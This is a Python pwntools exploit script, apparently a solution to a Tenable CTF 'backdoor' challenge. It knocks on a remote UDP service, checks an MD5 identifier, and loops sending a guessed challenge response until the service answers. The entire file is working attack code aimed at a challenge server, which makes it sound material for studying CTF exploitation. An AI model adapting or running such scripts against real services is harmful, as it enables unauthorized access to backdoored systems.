#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
from pwn import *
from Crypto.Util.number import getPrime, inverse, bytes_to_long, long_to_bytes
import hashlib
import os

# Set up pwntools for the correct architecture
exe = context.binary = ELF('backdoor')

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 9999)

if args.REMOTE:
    host,port = 'alpha.tenable-ctf.io', 21210

def start():
    return remote(host, port, typ="udp")

import random, string

def randstr(length):
   letters = ''.join([chr(0x21+i) for i in range(93)])
   return ''.join(random.choice(letters) for i in range(length))


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#io = start()
knock_channel = start()
set_symmetric_key_channel = start()
send_challenge_response_channel = start()

calc_identifier = hashlib.md5(b'__SLYCOMM_S4x22__'.ljust(0x80, b'\x00')).digest()
exploitChallenge = b'+SERVICE'

while True:
    msg = randstr(0x80)
    
    for i in range(10):
        knock_channel.send(b'KNOCK,KNOCK')
        identifier = knock_channel.recv(timeout=1)
        if identifier != b'':
            print(identifier, calc_identifier)
            assert calc_identifier == identifier
            break
    # hs = 0
    set_symmetric_key_channel.send(msg)
    # hs = 1
    challenge = set_symmetric_key_channel.recv()
    print(len(challenge), challenge.hex())
    assert len(challenge) == 0x80
    send_challenge_response_channel.send(hashlib.md5(exploitChallenge).digest())
    buf = send_challenge_response_channel.recv(timeout=0.2)
    if buf != b'':
        print(buf)
        os.system('speaker-test -t sine -f 1000 -l 1')
        ui.pause()
